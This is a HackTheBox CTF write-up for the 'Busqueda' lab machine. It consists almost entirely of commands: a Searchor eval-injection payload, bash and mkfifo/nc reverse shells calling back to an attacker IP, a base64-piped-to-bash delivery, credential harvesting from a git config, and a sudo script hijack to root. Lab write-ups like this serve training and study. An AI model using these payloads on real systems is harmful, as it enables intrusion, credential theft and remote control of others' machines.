+++
title = "HackTheBox - Busqueda Writeup"
date = "2026-04-15"
description = "SearchorのRCEから侵入し、Git情報漏洩とDocker経由で権限昇格するマシン"
tags = ["HackTheBox", "CTF", "Linux", "RCE", "Searchor", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

  Field     Details
  --------- ----------
  Machine   Busqueda
  OS        Linux

------------------------------------------------------------------------

## Reconnaissance

### Nmap Scan

``` bash
nmap -sV 10.129.228.217
```

``` text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.52

Host: searcher.htb
OS: Linux
```

------------------------------------------------------------------------

## Web Exploitation (Searchor RCE)

``` python
url = eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")
```

``` bash
POST
engine=Accuweather&query=') + str(__import__('os').system('id')) #
```

``` text
uid=1000(svc) gid=1000(svc)
```

------------------------------------------------------------------------

## Payload Generation

``` bash
bash -i >& /dev/tcp/10.10.16.166/1337 0>&1
```

------------------------------------------------------------------------

## Upload / Delivery

``` bash
POST
engine=Accuweather&query=') + str(__import__('os').system('echo <BASE64>|base64 -d|bash')) #
```

------------------------------------------------------------------------

## Listener

``` bash
nc -lvnp 1337
```

------------------------------------------------------------------------

## Foothold

``` bash
whoami
```

``` text
svc
```

------------------------------------------------------------------------

## Post Exploitation

``` bash
cd /var/www/app/.git
cat config
```

``` text
http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/
```

------------------------------------------------------------------------

## Privilege Escalation

``` bash
sudo -l
```

``` text
(root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

``` bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq | grep PASS
```

``` text
GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh
```

------------------------------------------------------------------------

## Root Exploit

``` bash
ssh svc@10.129.228.217 
echo -en "#! /bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.166 9001 >/tmp/f" > /tmp/full-checkup.sh
chmod +x /tmp/full-checkup.sh
```

``` bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

------------------------------------------------------------------------

## Flags

``` bash
cat user.txt
```

``` bash
cat root.txt
```

------------------------------------------------------------------------

## Summary

Searchor RCE → svc → Git creds → Gitea → Docker → sudo exploit → root
